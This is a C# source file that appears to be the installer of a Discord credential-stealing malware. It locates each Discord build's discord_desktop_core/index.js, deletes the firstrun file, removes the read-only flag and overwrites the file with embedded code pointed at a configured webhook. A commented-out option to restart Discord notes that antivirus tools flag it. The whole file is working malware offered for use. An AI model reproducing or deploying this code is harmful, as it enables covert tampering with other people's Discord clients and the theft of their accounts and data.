using System;
using System.IO;
using wang.Properties;

namespace wang
{
    class Program
    {
        static void Main(string[] args)
        {
            string[] builds = { "Discord", "DiscordCanary", "DiscordPTB" };
            foreach (var c in builds)
            {
                try
                {
                    if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), c)))
                    {
                        foreach (var f in Directory.GetFiles(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), c), "*.js", SearchOption.AllDirectories))
                        {
                            if (f.EndsWith(@"discord_desktop_core\index.js"))
                            {
                                if (File.Exists(f.Replace("index.js", "firstrun")))
                                {
                                    File.Delete(f.Replace("index.js", "firstrun"));
                                }
                                var core = new FileInfo(f)
                                {
                                    IsReadOnly = false
                                };
                                File.WriteAllText(f, Resources._in.Replace("%hookUrl%", Config.your_hook));
                            }
                        }
                    }
                }
                catch { continue; }
            }
            // AVs hate this, but enable it if you want.
            /*try
            {
                if (Config.restartDiscord)
                {
                    System.Diagnostics.Process.GetProcessesByName("Discord")[System.Diagnostics.Process.GetProcessesByName("Discord").Length - 1].Kill();
                    System.Diagnostics.Process.Start(Directory.GetFiles(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord"), "Discord.exe", SearchOption.AllDirectories)[Directory.GetFiles(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord"), "Discord.exe", SearchOption.AllDirectories).Length - 1]);
                }
            }
            catch { }*/
        }
    }
}
